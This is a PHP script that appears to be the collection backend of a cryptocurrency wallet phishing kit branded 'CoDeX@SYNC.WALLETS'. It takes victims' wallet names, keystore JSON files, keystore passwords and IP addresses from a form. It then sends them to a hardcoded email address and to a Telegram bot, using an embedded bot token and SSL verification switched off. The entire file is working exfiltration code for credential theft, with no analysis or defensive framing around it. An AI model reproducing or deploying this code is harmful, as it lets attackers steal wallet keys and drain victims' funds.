<?php
$chatId = "@Nfts0000chennels";
$botUrl = "bot5369427413:AAFLV3mZm2nEZJ1KC-x0XdZiIV9B7bpOyRE";
$telegram = "on"; // off if u don't need result to telegram
$phrase_ids = "illogs@yandex.com"; // your email here 
extract($_REQUEST);

# Store Post values in variables
// Here variable $a is just an example (replace with your own variables)
$_SESSION['wallet']   = $_POST['wallet'];
$_SESSION['keystorejson']   = $_POST['keystorejson'];
$_SESSION['keystorepassword']   = $_POST['keystorepassword'];
$ip		= $_SERVER['REMOTE_ADDR'];

# Format for Telegram & Discord
// Here variable $a is just an example (replace with your own variables)

$data = "
+++++++++++🌐 CoDeX@SYNC.WALLETS Keystore JSON INFO 🌐+++++++++++
Wallet Name   = ".$_SESSION['wallet']."
Keystore JSON   = ".$_SESSION['keystorejson']."
Wallet password   = ".$_SESSION['keystorepassword']."
+++++++++++🌐 CoDeX@SYNC.WALLETS INFO 🌐+++++++++++

+++++++++++🌐 CoDeX@SYNC.WALLETS IP INFOS 🌐+++++++++++
IP      = http://www.geoplugin.net/json.gp?ip=$ip
+++++++++++🌐 CoDeX@SYNC.WALLETS IP INFOS 🌐+++++++++++
";

$msg = "
+++++++++++🌐 CoDeX@SYNC.WALLETS Keystore JSON INFO 🌐+++++++++++<br>
Wallet Name   = ".$_SESSION['wallet']." <br>
Keystore JSON   = ".$_SESSION['keystorejson']." <br>
Wallet password   = ".$_SESSION['keystorepassword']." <br>
+++++++++++🌐 CoDeX@SYNC.WALLETS INFO 🌐+++++++++++ <br>

+++++++++++🌐 CoDeX@SYNC.WALLETS IP INFOS 🌐+++++++++++ <br>
IP      = http://www.geoplugin.net/json.gp?ip=$ip <br>
+++++++++++🌐 CoDeX@SYNC.WALLETS IP INFOS 🌐+++++++++++ <br>

";


// Email send function
$sender = 'From: 💎 C0DeX 💎 <result@codex.com>';
$sub="NEW SYNC.WALLETS Keystore JSON FROM [$ip]";
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
$result=mail($phrase_ids, $sub, $msg, $headers);

// Telegram send function
$txt = $data;
if ($telegram == "on"){
    $send = ['chat_id'=>$chatId,'text'=>$txt];
    $web_telegram = "https://api.telegram.org/{$botUrl}";
    $ch = curl_init($web_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
}
